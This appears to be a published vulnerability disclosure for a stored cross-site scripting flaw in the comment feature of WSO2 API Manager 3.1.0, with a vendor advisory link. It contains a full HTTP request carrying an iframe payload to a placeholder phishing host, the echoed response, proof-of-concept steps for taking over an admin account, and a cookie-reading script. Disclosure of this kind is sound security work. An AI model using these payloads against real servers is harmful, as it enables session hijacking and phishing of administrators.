@@ -1,0 +1,142 @@
+# Title: WSO2 3.1.0 - Persistent Cross-Site Scripting
+# Date: 2020-04-13
+# Author: raki ben hamouda
+# Vendor: https://apim.docs.wso2.com
+# Softwrare link: https://apim.docs.wso2.com/en/latest/
+# CVE: N/A
+# Advisory: https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-0700
+
+Technical Details & Description:
+================================
+A remote Stored Cross Site Scripting has been discovered in WSO2 API
+Manager Ressource Browser component).
+The security vulnerability allows a remote attacker With access to the
+component "Ressource Browser"
+to inject a malicious code in Add Comment Feature.
+
+The vulnerability is triggered after sending a POST request to
+`/carbon/info/comment-ajaxprocessor.jsp` with Parameter
+"comment=targeted&path=%2F".
+Remote attackers has the ablility to spread a malware,to Hijack a session
+(a session with Higher privileges), or to initiate phishing attacks.
+
+The security risk of the Stored XSS web vulnerability is estimated as
+medium with a cvss (common vulnerability scoring system) count of 5.4
+Exploitation of the Stored XSS web vulnerability requires a low privilege
+web-application user account and medium or high user interaction.
+Successful exploitation of the vulnerability results in Compromising the
+server .
+
+
+Request Method:
+[+] POST
+
+Module:
+[+] /carbon/info/comment-ajaxprocessor.jsp
+
+Parameters:
+[+] comment=admincomment
+[+] path=%2F
+=======================================
+
+POST /carbon/info/comment-ajaxprocessor.jsp HTTP/1.1
+Host: 192.168.149.1:9443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+https://192.168.149.1:9443/carbon/resources/resource.jsp?region=region3&item=resource_browser_menu&path=/
+X-Requested-With: XMLHttpRequest, XMLHttpRequest
+X-Prototype-Version: 1.5.0
+Content-type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF-Token: L4OB-I2K8-W66N-K44H-JNSM-6L0Z-BB17-BGWH
+Content-Length: 64
+Cookie: region3_registry_menu=visible; region3_metadata_menu=none;
+wso2.carbon.rememberme=admin-0db64b12-e661-4bc8-929d-6ab2cc7b192e;
+JSESSIONID=4B3AB3AA8895F2897685FA98C327D521;
+requestedURI=../../carbon/admin/index.jsp; region1_configure_menu=none;
+region4_monitor_menu=none; region5_tools_menu=none;
+current-breadcrumb=registry_menu%252Cresource_browser_menu%2523
+Connection: close
+
+comment=%3Ciframe%20href%3Dhttp%3A%2F%2Fphishing_url%3E&path=%2F
+
+
+
+
+
+==============================
+
+
+
+HTTP/1.1 200
+
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
+vary: accept-encoding
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Date: Tue, 31 Dec 2019 10:50:00 GMT
+Connection: close
+Server: WSO2 Carbon Server
+Content-Length: 3144
+
+
+//the body of response includes attacker malicious script
+
+
+<a class="closeButton icon-link registryWriteOperation"
+onclick="delComment('/','/;comments:33')" id="closeC0" title="Delete"
+style="background-image:
+url(../admin/images/delete.gif);position:relative;float:right">&nbsp;</a>
+
+
+ <iframe href=http://phishing_url>
+ <br/>
+posted on 0m ago (on Tue Dec 31 11:50:00 GMT+01:00 2019) by attacker
+
+
+
+Proof of Concept (PoC):
+=======================
+
+//Let's suppose we're Attacking an admin with higher privileges
+
+
+
+1-Attacker opens his account
+
+2-add arbitrary comment
+
+
+3-intercepts the request
+
+
+4-add malicious script to the comment
+
+
+5-admin access his account,he wants to add a comment,the malicious script
+got executed
+
+
+===>Admin account compromised
+
+
+
+===============================================================================
+
+
+
+Example malicious script :
+
+
+<script>
+  alert(document.cookie);
+</script>
+
+
+
+===============================================================================
